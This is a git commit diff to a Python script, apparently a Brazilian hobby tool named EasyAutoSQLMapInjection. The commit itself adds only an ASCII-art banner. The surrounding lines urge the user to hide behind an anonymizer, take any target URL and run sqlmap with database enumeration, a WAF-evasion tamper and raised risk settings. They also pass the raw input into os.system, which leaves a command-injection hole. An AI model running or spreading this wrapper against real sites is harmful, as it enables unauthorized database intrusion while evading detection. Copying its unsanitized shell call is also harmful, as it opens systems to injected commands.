0520af12fd787232d1536d18489ff592e70613b9
Gabriel B <118214293+LimitRecreator@users.noreply.github.com>
2024-03-05 13:11:24 -0300

    Update sqlattackauto.py

--- EasyAutoSQLMapInjection/sqlattackauto.py
+++ EasyAutoSQLMapInjection/sqlattackauto.py
@@ -3,6 +3,16 @@ import os
 print("SEMPRE USE UM ANONIMALIZADOR ! ! !")
 print("RECOMENDAÇÃO: use o anonsurf | para isso tem o script de instalação e execução "BR_AutoAnonsurf")
 
+print('''
+ __                    __           
+(_  .  _   _  |  _  / |_   _   _    
+__) | ||| |_) | (- /  |__ (_| _) \/ 
+          |                      /  
+                           __                            
+|_     .   |   .  _  . |_ |__)  _  _  _  _  _  |_  _   _ 
+|_) \/ .   |__ | ||| | |_ | \  (- (_ |  (- (_| |_ (_) |  
+    /                                                    
+''')
 
 url = input(str("Digite ou cole o URL alvo: "))
 os.system(f"sqlmap {url} --dbs --batch --random-agent --level 4 --risk 2 --tamper=space2comment")
